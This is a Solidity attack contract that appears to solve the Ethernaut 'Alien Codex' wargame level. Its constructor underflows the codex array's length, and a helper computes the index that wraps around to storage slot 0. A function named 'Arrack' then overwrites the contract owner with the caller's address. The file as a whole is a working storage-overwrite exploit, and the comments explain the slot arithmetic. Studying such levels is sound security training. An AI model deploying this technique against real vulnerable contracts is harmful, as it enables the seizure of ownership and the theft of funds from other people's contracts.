// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IAlienCodex {
    function owner() external view returns (address);
    function codex(uint256) external view returns (bytes32);
    function retract() external;
    function make_contact() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AttackOnAlian {
    /*
    storage
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - length of the array codex

    // slot where array element is stored = keccak256(slot)) + index
    // h = keccak256(1)
    slot h + 0 - codex[0] 
    slot h + 1 - codex[1] 
    slot h + 2 - codex[2] 
    slot h + 3 - codex[3] 

    Find i such that
    slot h + i = slot 0
    h + i = 0 so i = 0 - h
    */
    IAlienCodex private immutable Alien;

    constructor(address _alian) {
        Alien = IAlienCodex(_alian);
        Alien.make_contact();
        Alien.retract();
    }

    function getIndex() public pure returns (uint256) {
        bytes32 start = keccak256(abi.encode(bytes32(uint256(1))));
        uint256 startCodex = uint256(start);
        uint256 max = 2 ** 256 - 1;
        return max - startCodex + 1;
    }
    function Arrack() public {
        Alien.revise(getIndex(), bytes32(uint256(uint160(msg.sender))));
    }
}
